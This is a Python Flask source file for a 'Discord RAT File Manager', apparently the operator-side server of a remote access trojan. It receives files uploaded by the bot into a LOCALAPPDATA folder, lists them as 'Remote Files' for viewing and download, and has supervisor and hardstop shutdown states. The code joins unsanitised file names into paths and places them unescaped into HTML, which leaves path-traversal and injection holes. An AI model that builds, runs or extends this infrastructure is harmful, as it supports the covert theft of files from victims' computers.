from flask import Flask, send_file, request, render_template_string
import os, sys, traceback, threading, time

def get_local_appdata():
    return os.getenv("LOCALAPPDATA")

TARGET_DIR = os.path.join(get_local_appdata(), "Discord-RAT-Bot")
os.makedirs(TARGET_DIR, exist_ok=True)
STATE_FILE = os.path.join(TARGET_DIR, "state.txt")
UPLOAD_FOLDER = os.path.join(TARGET_DIR, "uploads")
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

if not os.path.exists(STATE_FILE):
    with open(STATE_FILE, "w") as f:
        f.write("running")

app = Flask(__name__)

def get_state():
    try:
        with open(STATE_FILE, "r") as f:
            content = f.read().strip().lower()
            return content if content else "running"
    except:
        return "running"

def shutdown_server():
    func = request.environ.get("werkzeug.server.shutdown")
    if func:
        func()

@app.route("/shutdown", methods=["POST"])
def shutdown():
    state = request.args.get("state", "hardstop")
    with open(STATE_FILE, "w") as f:
        f.write(state)

    def kill():
        time.sleep(1)
        os._exit(0)

    threading.Thread(target=kill).start()
    return "Server shutting down...", 200

@app.route("/")
def home():
    try:
        state = get_state()
        files = os.listdir(UPLOAD_FOLDER)

        html = """
        <html>
        <head><title>Discord RAT File Manager</title></head>
        <body style="background:#111; color:#eee; text-align:center; font-family:sans-serif;">
            {% if state == 'supervisor' %}
                <h2 style="color:orange;">Supervisor Mode — Bot is currently offline</h2>
            {% else %}
                <h2 style="color:#4f4;">Bot Online — Active Session Running</h2>
            {% endif %}
            <hr style="border-color:#333; margin-bottom:20px;">
            <h1>Remote Files</h1>

            {% for f in files %}
                <div style="margin:10px;">
                    <a href="/view/{{ f }}" style="color:#4af; text-decoration:none; cursor:pointer;">
                        {{ f }}
                    </a>
                    <a href="/download/{{ f }}" style="color:#aaa; margin-left:15px;">[Download]</a>
                </div>
            {% endfor %}

            {% if not files %}
                <p>No files have been uploaded.</p>
            {% endif %}
        </body>
        </html>
        """

        if state == "hardstop":
            shutdown()
            return "Server is shutting down due to Hardstop...", 200

        return render_template_string(html, files=files, state=state)

    except Exception:
        return f"<pre>{traceback.format_exc()}</pre>", 500

@app.route("/upload", methods=["POST"])
def upload_file():
    try:
        if "file" not in request.files:
            return "No file part", 400

        file = request.files["file"]
        if file.filename == "":
            return "No selected file", 400

        save_path = os.path.join(UPLOAD_FOLDER, file.filename)
        file.save(save_path)

        return "File uploaded successfully", 200

    except Exception as e:
        return f"Upload error: {e}", 500

@app.route("/view/<path:filename>")
def view_file(filename):
    try:
        path = os.path.join(UPLOAD_FOLDER, filename)

        if not os.path.exists(path):
            return "File not found", 404

        ext = filename.lower().split(".")[-1]

        if ext in ["png", "jpg", "jpeg", "gif", "bmp", "webp"]:
            return f"""
            <html>
            <body style='background:#111; color:#eee; text-align:center;'>
                <h2>{filename}</h2>
                <img src="/download/{filename}" style="max-width:90%; border:2px solid #444;">
            </body>
            </html>
            """

        if ext in ["txt", "log", "json", "py", "md", "html", "css", "js", "cfg", "ini"]:
            with open(path, "r", errors="ignore") as f:
                content = f.read()

            safe = content.replace("<", "&lt;").replace(">", "&gt;")

            return f"""
            <html>
            <body style='background:#111; color:#eee; padding:20px;'>
                <h2>{filename}</h2>
                <pre style="white-space:pre-wrap; background:#222; padding:15px; border-radius:8px;">{safe}</pre>
            </body>
            </html>
            """

        return send_file(path, as_attachment=True)

    except Exception as e:
        return f"Error: {e}", 500

@app.route("/download/<filename>")
def download_file(filename):
    try:
        return send_file(os.path.join(UPLOAD_FOLDER, filename), as_attachment=True)
    except Exception as e:
        return str(e), 404

if __name__ == "__main__":
    if get_state() == "hardstop":
        sys.exit(0)
    app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)
    
